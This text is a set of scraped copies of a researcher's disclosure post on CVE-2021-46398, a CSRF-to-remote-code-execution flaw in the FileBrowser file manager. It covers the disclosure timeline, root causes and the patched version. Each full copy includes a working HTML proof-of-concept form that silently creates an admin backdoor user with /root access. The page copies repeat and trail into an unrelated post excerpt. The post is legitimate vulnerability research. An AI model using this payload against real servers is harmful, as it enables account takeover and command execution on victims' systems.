3. Using content-type “text/plain” makes the attack possible

4. Origin header is not validated

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf_request.png?w=756)

**RCE:**

Refer:

<https://filebrowser.org/configuration/command-runner>

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/command-runner.png?w=855)

**PATCH**

Update to the latest version as the flaw has been patched from v2.18.0

Commit: <https://github.com/filebrowser/filebrowser/commit/74b7cd8e81840537a8206317344f118093153e8d>

**CVE-2021-46398**

**Thank you.**

### Share this:

* [Twitter](https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/?share=twitter "Click to share on Twitter")
* [Facebook](https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/?share=facebook "Click to share on Facebook")
Like Loading...
### *Related*

[Uncategorized](https://febin0x4e4a.wordpress.com/category/uncategorised/)
[CVE-2021-46398](https://febin0x4e4a.wordpress.com/tag/cve-2021-46398/), [Exploit](https://febin0x4e4a.wordpress.com/tag/exploit/), [Hacking](https://febin0x4e4a.wordpress.com/tag/hacking/), [Security Research](https://febin0x4e4a.wordpress.com/tag/security-research/), [Vulnerability](https://febin0x4e4a.wordpress.com/tag/vulnerability/)

# Post navigation

[Tiny File Manager Authenticated RCE →](https://febin0x4e4a.wordpress.com/2022/01/23/tiny-file-manager-authenticated-rce/)

### Leave a comment [Cancel reply](/2022/01/19/critical-csrf-in-filebrowser/#respond)

Δ

Search for:

# Recent Posts

* [Privilege Escalation Vulnerability in Balena Etcher Software](https://febin0x4e4a.wordpress.com/2024/08/22/privilege-escalation-vulnerability-in-balena-etcher-software/)
* [CVE-2024-28739, CVE-2024-28740: XSS to One-Click RCE in Koha ILS](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/)
* [CVE-2023-44452, CVE-2023-51698: CBT File Parsing Argument Injection that affected Popular Linux Distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/)
* [CVE-2023-44451, CVE-2023-52076: EPUB File Parsing Directory Traversal RCE Vulnerability affecting popular distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/)
* [Zip Path Traversal in Asus Smartphone’s default FileManager App.](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/)
# Recent Comments

# Archives

* [August 2024](https://febin0x4e4a.wordpress.com/2024/08/)
* [March 2024](https://febin0x4e4a.wordpress.com/2024/03/)
* [January 2024](https://febin0x4e4a.wordpress.com/2024/01/)
* [December 2023](https://febin0x4e4a.wordpress.com/2023/12/)
* [October 2023](https://febin0x4e4a.wordpress.com/2023/10/)
* [September 2023](https://febin0x4e4a.wordpress.com/2023/09/)
* [January 2023](https://febin0x4e4a.wordpress.com/2023/01/)
* [March 2022](https://febin0x4e4a.wordpress.com/2022/03/)
* [January 2022](https://febin0x4e4a.wordpress.com/2022/01/)
# Categories

* [Uncategorized](https://febin0x4e4a.wordpress.com/category/uncategorised/)

[Blog at WordPress.com.](https://wordpress.com/?ref=footer_blog)

* [Comment](https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/#respond)
* Reblog
* Subscribe
  Subscribed

  + [![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/cropped-hacker-operate-laptop-cartoon-illustration_188898-166.jpg?w=50) febiNJ](https://febin0x4e4a.wordpress.com)

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Ffebin0x4e4a.wordpress.com%2F2022%2F01%2F19%2Fcritical-csrf-in-filebrowser%2F&signup_flow=account)
* Privacy
* + [![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/cropped-hacker-operate-laptop-cartoon-illustration_188898-166.jpg?w=50) febiNJ](https://febin0x4e4a.wordpress.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Ffebin0x4e4a.wordpress.com%2F2022%2F01%2F19%2Fcritical-csrf-in-filebrowser%2F&signup_flow=account)
  + [Copy shortlink](https://wp.me/pdF9Nn-2)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/)
  + [View post in Reader](https://wordpress.com/read/blogs/201901473/posts/2)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

%d

![](https://pixel.wp.com/b.gif?v=noscript)
Design a site like this with WordPress.com[Get started](https://wordpress.com/start/?ref=marketing_bar)



=== Content from febinj.medium.com_479d53d7_20250114_220751.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F865a3c34b8e7&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&source=---top_nav_layout_nav----------------------------------)

[Sign up](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fsystemweakness.com%2Fcritical-csrf-to-rce-in-filebrowser-865a3c34b8e7&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fsystemweakness.com%2Fcritical-csrf-to-rce-in-filebrowser-865a3c34b8e7&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

[Sign up](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fsystemweakness.com%2Fcritical-csrf-to-rce-in-filebrowser-865a3c34b8e7&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fsystemweakness.com%2Fcritical-csrf-to-rce-in-filebrowser-865a3c34b8e7&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# CVE-2021–46398 Critical CSRF to RCE in FileBrowser

[![Febin](https://miro.medium.com/v2/resize:fill:88:88/1*zv7xcTwEdRt8qRgdc3iQOw.png)](https://febinj.medium.com/?source=post_page---byline--865a3c34b8e7--------------------------------)[![System Weakness](https://miro.medium.com/v2/resize:fill:48:48/1*gncXIKhx5QOIX0K9MGcVkg.jpeg)](https://systemweakness.com/?source=post_page---byline--865a3c34b8e7--------------------------------)

[Febin](https://febinj.medium.com/?source=post_page---byline--865a3c34b8e7--------------------------------)

·

[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F1920561aec63&operation=register&redirect=https%3A%2F%2Fsystemweakness.com%2Fcritical-csrf-to-rce-in-filebrowser-865a3c34b8e7&user=Febin&userId=1920561aec63&source=post_page-1920561aec63--byline--865a3c34b8e7---------------------post_header-----------)

Published in[System Weakness](https://systemweakness.com/?source=post_page---byline--865a3c34b8e7--------------------------------)·4 min read·Jan 28, 2022

--

1

Listen

Share

![]()

**Introduction**

This is *Febin*, a security professional.

I used to pick random opensource software for my research, recently I took some web-based file management software as my research targets. There I found some popular web-based file managers, one of them was a software named “FileBrowser”. While poking around I was able to find an awesome vulnerability in the application that leads to account takeover, complete access to the filesystem, and command execution. This article is going to be on that vulnerability.

![]()

**Disclosure Timeline:**

October 16, 2021 — Contacted the vendor and reported the vulnerability

October 19, 2021 — Vendor replies back

October 30, 2021 — Vulnerability has been patched in version **v2.18.0**

February 4, 2022 — CVE ID was assigned. CVE-2021–46398

**Vendor/Software — Product Details**

Filebrowser provides a file managing interface within a specified directory and it can be used to upload, delete, preview, rename and edit your files. It allows the creation of multiple users and each user can have its own directory. It can be used as a standalone app or as a middleware.

Link**:** <https://filebrowser.org/>

**GitHub** **repo:** <https://github.com/filebrowser/filebrowser>

**The Vulnerability:** ***CSRF to RCE***

FileBrowser is a popular file manager/file managing interface developed in the Go language. Admin can create multiple users, even another Admin privileged user, and give access to any directory he wants, the user creation is handled by an endpoint “/api/users”.

The endpoint accepts input in JSON format to create users, but fails to verify that the “Content-Type” HTTP header, the Content-Type header’s value should be “application/json” but it accepts “text/plain” and that’s where the vulnerability arises. Also, the “Origin” is not validated and there are no anti-CSRF tokens implemented either.

Hence an attacker can easily exploit this vulnerability to create a backdoor user with admin privileges and access to the home directory or whichever directory the attacker wants to access, just by sending a malicious webpage URL to the legitimate admin and access the whole filesystem of the victim.

And an admin can run commands on the system, so this vulnerability leads to an RCE.

![]()

**Affected Versions: *v2.17.2 and below versions were affected. =< 2.17.2***

**Proof Of Concept:** **The below HTML code will exploit the Flaw**
<html>

<body style=”text-align:center;”>
 <h1> FileBrowser CSRF PoC by Febin </h1>
 <form action=”<http://ubuntu.local:8080/api/users>" method=”POST” enctype=”text/plain”>

<input type=”hidden” name=’{“what”:”user”,”which”:[],”data”:{“scope”:”../../../../root/”,”locale”:”en”,”viewMode”:”mosaic”,”singleClick”:false,”sorting”:{“by”:””,”asc”:false},”perm”:{“admin”:true,”execute”:true,”create”:true,”rename”:true,”modify”:true,”delete”:true,”share”:true,”download”:true},”commands”:[],”hideDotfiles”:false,”username”:”pwned”,”password”:””,”rules”:[{“allow”:true,”path”:”../”,”regex”:false,”regexp”:{“raw”:””}}],”lockPassword”:false,”id”:0,”password”:”pwned”}}’ value=’test’>
 <input type=”submit” value=”CLICK ME!”>
 </form>

</body>

</html>

**Exploit-DB:** <https://www.exploit-db.com/exploits/50717>

1. **I started a filebrowser instance inside my ubuntu VM**

![]()

**2. I hosted the exploit on a simple HTTP server inside my host OS.**

![]()![]()

**3. When I click the “CLICK ME!” button, it sends a POST request in the background towards the filebrowser URL and that creates a backdoor user named “pwned” with access to the “/root/” directory.**

![]()![]()

Logged in as pwned user.

![]()

Root Cause:
1. X-Auth header is not validated properly

2. No Anti-CSRF token

3. Using content-type “text/plain” makes the attack possible

4. Origin header is not validated

![]()

**RCE:**

Refer:

<https://filebrowser.org/configuration/command-runner>

![]()

**PATCH**

Update to the latest version as the flaw has been patched from v2.18.0

Commit: <https://github.com/filebrowser/filebrowser/commit/74b7cd8e81840537a8206317344f118093153e8d>

***CVE-2021–46398***

**Thank you.**

[Exploit](https://medium.com/tag/exploit?source=post_page-----865a3c34b8e7--------------------------------)[Exploitation](https://medium.com/tag/exploitation?source=post_page-----865a3c34b8e7--------------------------------)[Vulnerability Research](https://medium.com/tag/vulnerability-research?source=post_page-----865a3c34b8e7--------------------------------)[Security Research](https://medium.com/tag/security-research?source=post_page-----865a3c34b8e7--------------------------------)[Hacking](https://medium.com/tag/hacking?source=post_page-----865a3c34b8e7--------------------------------)

--

--

1

[![System Weakness](https://miro.medium.com/v2/resize:fill:96:96/1*gncXIKhx5QOIX0K9MGcVkg.jpeg)](https://systemweakness.com/?source=post_page---post_publication_info--865a3c34b8e7--------------------------------)[![System Weakness](https://miro.medium.com/v2/resize:fill:128:128/1*gncXIKhx5QOIX0K9MGcVkg.jpeg)](https://systemweakness.com/?source=post_page---post_publication_info--865a3c34b8e7--------------------------------)[## Published in System Weakness](https://systemweakness.com/?source=post_page---post_publication_info--865a3c34b8e7--------------------------------)[5.9K Followers](/followers?source=post_page---post_publication_info--865a3c34b8e7--------------------------------)·[Last published 13 hours ago](/the-silicon-valley-penetration-testing-methodology-blueprint-a008285bf669?source=post_page---post_publication_info--865a3c34b8e7--------------------------------)

System Weakness is a publication that specialises in publishing upcoming writers in cybersecurity and ethical hacking space. Our security experts write to make the cyber universe more secure, one vulnerability at a time.

[![Febin](https://miro.medium.com/v2/resize:fill:96:96/1*zv7xcTwEdRt8qRgdc3iQOw.png)](https://febinj.medium.com/?source=post_page---post_author_info--865a3c34b8e7--------------------------------)[![Febin](https://miro.medium.com/v2/resize:fill:128:128/1*zv7xcTwEdRt8qRgdc3iQOw.png)](https://febinj.medium.com/?source=post_page---post_author_info--865a3c34b8e7--------------------------------)[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F1920561aec63&operation=register&redirect=https%3A%2F%2Fsystemweakness.com%2Fcritical-csrf-to-rce-in-filebrowser-865a3c34b8e7&user=Febin&userId=1920561aec63&source=post_page-1920561aec63--post_author_info--865a3c34b8e7---------------------follow_profile-----------)[## Written by Febin](https://febinj.medium.com/?source=post_page---post_author_info--865a3c34b8e7--------------------------------)[192 Followers](https://febinj.medium.com/followers?source=post_page---post_author_info--865a3c34b8e7--------------------------------)·[30 Following](https://medium.com/%40febinj/following?source=post_page---post_author_info--865a3c34b8e7--------------------------------)

CEH | CEH(Master) | eJPT | OSCP | CRTP |CyberSecurity Enthusiast | Security Researcher | Bug Hunter | Always seeks for knowledge

[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F1920561aec63&operation=register&redirect=https%3A%2F%2Fsystemweakness.com%2Fcritical-csrf-to-rce-in-filebrowser-865a3c34b8e7&user=Febin&userId=1920561aec63&source=post_page-1920561aec63--post_author_info--865a3c34b8e7---------------------follow_profile-----------)
## Responses (1)

See all responses[Help](https://help.medium.com/hc/en-us?source=post_page-----865a3c34b8e7--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----865a3c34b8e7--------------------------------)[About](https://medium.com/about?autoplay=1&source=post_page-----865a3c34b8e7--------------------------------)[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----865a3c34b8e7--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----865a3c34b8e7--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----865a3c34b8e7--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----865a3c34b8e7--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----865a3c34b8e7--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----865a3c34b8e7--------------------------------)[Teams](https://medium.com/business?source=post_page-----865a3c34b8e7--------------------------------)



=== Content from febin0x4e4a.blogspot.com_1695a467_20250115_193649.html ===

[Skip to main content](#main)

### Search This Blog

# [FebiNJ](https://febin0x4e4a.blogspot.com/)

InfoSec Enthusiast

## Posts

Showing posts with the label Exploit

[Show all](https://febin0x4e4a.blogspot.com/)

### [CVE-2021–46398 Critical CSRF to RCE in FileBrowser](https://febin0x4e4a.blogspot.com/2022/01/critical-csrf-in-filebrowser.html)

* Get link
* Facebook
* X
* Pinterest
* Email
* Other Apps

-

[January 17, 2022](https://febin0x4e4a.blogspot.com/2022/01/critical-csrf-in-filebrowser.html "permanent link")

![Image](https://lh3.googleusercontent.com/blogger_img_proxy/AEn0k_sKgoP1rB5xoHzrFBtRnWF-272HMYZ83og_rWZIL-Xk9h5pGiAbVhq7xJLMhAOXOIbGx_4ZW2phE350jFoabNmtUByU6tAbsx_Do_NOfFpr16A0uFcpysKJxa0_YQn0AO8cVFj7Yruh)

Introduction This is Febin , a security professional. I used to pick random opensource software for my research, recently I took some web-based file management software as my research targets. There I found some popular web-based file managers, one of them was a software named “FileBrowser”. While poking around I was able to find an awesome vulnerability in the application that leads to account takeover, complete access to the filesystem, and command execution. This article is going to be on that vulnerability. Disclosure Timeline: October 16, 2021 – Contacted the vendor and reported the vulnerability October 19, 2021 – Vendor replies back October 30, 2021 – Vulnerability has been patched in version v2.18.0 February 4, 2021 – CVE ID was assigned. CVE-2021-46398 Vendor/Software – Product Details Filebrowser provides a file managing interface within a specified directory and it can be used to upload, del...

[Post a Comment](https://febin0x4e4a.blogspot.com/2022/01/critical-csrf-in-filebrowser.html#comments)

[Read more](https://febin0x4e4a.blogspot.com/2022/01/critical-csrf-in-filebrowser.html "CVE-2021–46398 Critical CSRF to RCE in FileBrowser")

### [Tiny File Manager Authenticated RCE](https://febin0x4e4a.blogspot.com/2022/01/tiny-file-manager-authenticated-rce.html)

* Get link
* Facebook
* X
* Pinterest
* Email
* Other Apps

-

[January 14, 2022](https://febin0x4e4a.blogspot.com/2022/01/tiny-file-manager-authenticated-rce.html "permanent link")

![Image](https://lh3.googleusercontent.com/blogger_img_proxy/AEn0k_sSsUKUEICiSYp-6MttEY7uw8psL4P-pRPq387tz22gVcXEj9EE25oKSTje_tfUexw-2h0Fs7vIzWF1mCop-HU0X1pqI50V9JEmP6YKbpON69rLWXfwOi7RaCWMkZQHBiQbJBixOxh87G673PcsR3THn3Aua3518Ga9w7L1fRkB-18mnrGWRKY6EzCG5Y5WYYPE3p_2234CJ4QwTKG_3xjl24s-f0bGFMxk8a2Lx4lYmoTLg-bSodhdcxKURmD1ogCpK2JwSYVI_6y7Lhp2rllQIQzTsiJIkuSHocraww5x4zS_fnS8o0jpkQzohAX9FR7phrvHFoeeRQZotWMY_88PJzAdq76VJ_RvqH_bApOG4ZbE1T7-gDhOFYycOsYyzRWxU61jTP3lYk_i0D99UrZNEvMhyCfBET_N3L2vQvrrMCnaEMYjMrDDZgnTFXTOA6nrzpRPVPbG5fxoG3p7-Tl5dA)

  Introduction   This is Febin , a security professional. I used to pick random opensource software for my research, recently I took some web based file management software as my research targets. There I found some popular web-based file managers, one of which was a software named " Tiny File Manager " . While poking around I was able to find an awesome vulnerability in the application that leads to code execution on the server. This article is going to be on that vulnerability. Disclosure Timeline:   September 16, 2021 - Contacted the developer and reported the vulnerability September 17, 2021 - Developer replies back September 20, 2021 - Developer verified the issue September 26, 2021 - I patched the source code, fixed the RCE and sent a pull request the the original repository. November 12, 2021 - Developer merged the commit. The vulnerability has been fixed. Vendor/Software Details   TinyFileManager is web based file manager and it is a simple, fast and s...

[Post a Comment](https://febin0x4e4a.blogspot.com/2022/01/tiny-file-manager-authenticated-rce.html#comments)

[Read more](https://febin0x4e4a.blogspot.com/2022/01/tiny-file-manager-authenticated-rce.html "Tiny File Manager Authenticated RCE")

[Powered by Blogger](https://www.blogger.com)

### Labels

* [CVE-2021–46398](https://febin0x4e4a.blogspot.com/search/label/CVE-2021%E2%80%9346398)
* [Exploit](https://febin0x4e4a.blogspot.com/search/label/Exploit)
* [Hacking](https://febin0x4e4a.blogspot.com/search/label/Hacking)
* [Vulnerability Research](https://febin0x4e4a.blogspot.com/search/label/Vulnerability%20Research)

### [Report Abuse](https://www.blogger.com/go/report-abuse)



=== Content from febin0x4e4a.wordpress.com_7672aa02_20250114_220750.html ===

# [febiNJ](https://febin0x4e4a.wordpress.com/)

## InfoSec Enthusiast

Menu
[Skip to content](#content)

* [Home](https://febin0x4e4a.wordpress.com/)
* [About](https://febin0x4e4a.wordpress.com/about/)

Search

Search for:

# Critical CSRF in FileBrowser

[19th January 202222nd March 2022](https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)

### CVE-2021-46398

**Introduction**

This is *Febin*, a security professional.

I used to pick random opensource software for my research, recently I took some web-based file management software as my research targets. There I found some popular web-based file managers, one of them was a software named “FileBrowser”. While poking around I was able to find an awesome vulnerability in the application that leads to account takeover, complete access to the filesystem, and command execution. This article is going to be on that vulnerability.

[![](https://raw.githubusercontent.com/filebrowser/logo/master/banner.png)](https://raw.githubusercontent.com/filebrowser/logo/master/banner.png)
[![](https://user-images.githubusercontent.com/5447088/50716739-ebd26700-107a-11e9-9817-14230c53efd2.gif)](https://user-images.githubusercontent.com/5447088/50716739-ebd26700-107a-11e9-9817-14230c53efd2.gif)

**Disclosure Timeline:**

October 16, 2021 – Contacted the vendor and reported the vulnerability

October 19, 2021 – Vendor replies back

October 30, 2021 – Vulnerability has been patched in version **v2.18.0**

February 4, 2022 – CVE ID was assigned. CVE-2021-46398

**Vendor/Software – Product Details**

Filebrowser provides a file managing interface within a specified directory and it can be used to upload, delete, preview, rename and edit your files. It allows the creation of multiple users and each user can have its own directory. It can be used as a standalone app or as a middleware.

Link**:** <https://filebrowser.org/>

**GitHub** **repo:** <https://github.com/filebrowser/filebrowser>

**The Vulnerability:** ***CSRF to RCE***

FileBrowser is a popular file manager/file managing interface developed in the Go language. Admin can create multiple users, even another Admin privileged user, and give access to any directory he wants, the user creation is handled by an endpoint “/api/users”.

The endpoint accepts input in JSON format to create users, but fails to verify that the “Content-Type” HTTP header, the Content-Type header’s value should be “application/json” but it accepts “text/plain” and that’s where the vulnerability arises. Also, the “Origin” is not validated and there are no anti-CSRF tokens implemented either.

Hence an attacker can easily exploit this vulnerability to create a backdoor user with admin privileges and access to the home directory or whichever directory the attacker wants to access, just by sending a malicious webpage URL to the legitimate admin and access the whole filesystem of the victim.

And an admin can run commands on the system, so this vulnerability leads to an RCE.

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf_request-1.png?w=756)

**Affected Versions: *v2.17.2 and below versions were affected. =< 2.17.2***

**Proof Of Concept:** **The below HTML code will exploit the Flaw**
<html>

<body style=”text-align:center;”>
  <h1> FileBrowser CSRF PoC by Febin </h1>
    <form action=”<http://ubuntu.local:8080/api/users>” method=”POST” enctype=”text/plain”>

<input type=”hidden” name='{“what”:”user”,”which”:[],”data”:{“scope”:”../../../../root/”,”locale”:”en”,”viewMode”:”mosaic”,”singleClick”:false,”sorting”:{“by”:””,”asc”:false},”perm”:{“admin”:true,”execute”:true,”create”:true,”rename”:true,”modify”:true,”delete”:true,”share”:true,”download”:true},”commands”:[],”hideDotfiles”:false,”username”:”pwned”,”password”:””,”rules”:[{“allow”:true,”path”:”../”,”regex”:false,”regexp”:{“raw”:””}}],”lockPassword”:false,”id”:0,”password”:”pwned”}}’ value=’test’>
      <input type=”submit” value=”CLICK ME!”>
    </form>

</body>

</html>

**Exploit-DB:** <https://www.exploit-db.com/exploits/50717>

**1. I started a filebrowser instance inside my ubuntu VM**

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fb_csrf.png?w=942)

**2. I hosted the exploit on a simple HTTP server inside my host OS.**

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf1-1.png?w=1024)
![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf2.png?w=1024)

**3. When I click the “CLICK ME!” button, it sends a POST request in the background towards the filebrowser URL  and that creates a backdoor user named “pwned” with access to the “/root/” directory.**

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf3.png?w=648)
![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf4.png?w=1024)

Logged in as pwned user.

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf_root.png?w=1024)

Root Cause:
1. X-Auth header is not validated properly

2. No Anti-CSRF token

3. Using content-type “text/plain” makes the attack possible

4. Origin header is not validated

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf_request.png?w=756)

**RCE:**

Refer:

<https://filebrowser.org/configuration/command-runner>

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/command-runner.png?w=855)

**PATCH**

Update to the latest version as the flaw has been patched from v2.18.0

Commit: <https://github.com/filebrowser/filebrowser/commit/74b7cd8e81840537a8206317344f118093153e8d>

**CVE-2021-46398**

**Thank you.**

### Share this:

* [Twitter](https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/?share=twitter "Click to share on Twitter")
* [Facebook](https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/?share=facebook "Click to share on Facebook")
Like Loading...
### *Related*

[Uncategorized](https://febin0x4e4a.wordpress.com/category/uncategorised/)
[CVE-2021-46398](https://febin0x4e4a.wordpress.com/tag/cve-2021-46398/), [Exploit](https://febin0x4e4a.wordpress.com/tag/exploit/), [Hacking](https://febin0x4e4a.wordpress.com/tag/hacking/), [Security Research](https://febin0x4e4a.wordpress.com/tag/security-research/), [Vulnerability](https://febin0x4e4a.wordpress.com/tag/vulnerability/)

# Post navigation

[Tiny File Manager Authenticated RCE →](https://febin0x4e4a.wordpress.com/2022/01/23/tiny-file-manager-authenticated-rce/)

### Leave a comment [Cancel reply](/2022/01/19/critical-csrf-in-filebrowser/#respond)

Δ

Search for:

# Recent Posts

* [Privilege Escalation Vulnerability in Balena Etcher Software](https://febin0x4e4a.wordpress.com/2024/08/22/privilege-escalation-vulnerability-in-balena-etcher-software/)
* [CVE-2024-28739, CVE-2024-28740: XSS to One-Click RCE in Koha ILS](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/)
* [CVE-2023-44452, CVE-2023-51698: CBT File Parsing Argument Injection that affected Popular Linux Distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/)
* [CVE-2023-44451, CVE-2023-52076: EPUB File Parsing Directory Traversal RCE Vulnerability affecting popular distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/)
* [Zip Path Traversal in Asus Smartphone’s default FileManager App.](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/)
# Recent Comments

# Archives

* [August 2024](https://febin0x4e4a.wordpress.com/2024/08/)
* [March 2024](https://febin0x4e4a.wordpress.com/2024/03/)
* [January 2024](https://febin0x4e4a.wordpress.com/2024/01/)
* [December 2023](https://febin0x4e4a.wordpress.com/2023/12/)
* [October 2023](https://febin0x4e4a.wordpress.com/2023/10/)
* [September 2023](https://febin0x4e4a.wordpress.com/2023/09/)
* [January 2023](https://febin0x4e4a.wordpress.com/2023/01/)
* [March 2022](https://febin0x4e4a.wordpress.com/2022/03/)
* [January 2022](https://febin0x4e4a.wordpress.com/2022/01/)
# Categories

* [Uncategorized](https://febin0x4e4a.wordpress.com/category/uncategorised/)

[Create a free website or blog at WordPress.com.](https://wordpress.com/?ref=footer_website)

* [Comment](https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/#respond)
* Reblog
* Subscribe
  Subscribed

  + [![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/cropped-hacker-operate-laptop-cartoon-illustration_188898-166.jpg?w=50) febiNJ](https://febin0x4e4a.wordpress.com)

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Ffebin0x4e4a.wordpress.com%2F2022%2F01%2F19%2Fcritical-csrf-in-filebrowser%2F&signup_flow=account)
* Privacy
* + [![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/cropped-hacker-operate-laptop-cartoon-illustration_188898-166.jpg?w=50) febiNJ](https://febin0x4e4a.wordpress.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Ffebin0x4e4a.wordpress.com%2F2022%2F01%2F19%2Fcritical-csrf-in-filebrowser%2F&signup_flow=account)
  + [Copy shortlink](https://wp.me/pdF9Nn-2)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/)
  + [View post in Reader](https://wordpress.com/read/blogs/201901473/posts/2)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

%d

![](https://pixel.wp.com/b.gif?v=noscript)
Design a site like this with WordPress.com[Get started](https://wordpress.com/start/?ref=marketing_bar)



=== Content from febin0x4e4a.wordpress.com_b8751509_20250115_123736.html ===

# [febiNJ](https://febin0x4e4a.wordpress.com/)

## InfoSec Enthusiast

Menu
[Skip to content](#content)

* [Home](https://febin0x4e4a.wordpress.com/)
* [About](https://febin0x4e4a.wordpress.com/about/)

Search

Search for:

# Security Research

# [CVE-2023-44452, CVE-2023-51698: CBT File Parsing Argument Injection that affected Popular Linux Distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/)

[17th January 2024](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/#respond)

*A Critical One-Click RCE/Command Injection Vulnerability Affecting Popular Linux Operating Systems with MATE, Cinnamon, and some Xfce desktop Environments.*

My 9th and 11th CVEs

**Affected Operating Systems:**

Linux Mint
Kali Linux (Popular OS among Security professionals, and researchers)
Parrot OS (Popular OS among Security professionals, and researchers)
Ubuntu-Mate
Xubuntu
Fedora Cinnamon
Fedora Mate
Manjaro Mate
Manjaro Cinnamon
Ubuntu Kylin (Official Chinese Ubuntu)
Kylin OS V10 ( OS said to be used in the Chinese Government Sectors )

And other MATE, Cinnamon, and some Xfce desktop Environments.

Affected Software Component: All versions including the latest versions of Atril Document Viewer (Default Doc reader for MATE environment, one of the popular doc readers) and Xreader Document Viewer (Default doc reader in Linux Mint)

**Vulnerability Summary:**

This vulnerability allows remote attackers to execute arbitrary code on affected installations of Linux Mint Xreader. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file.

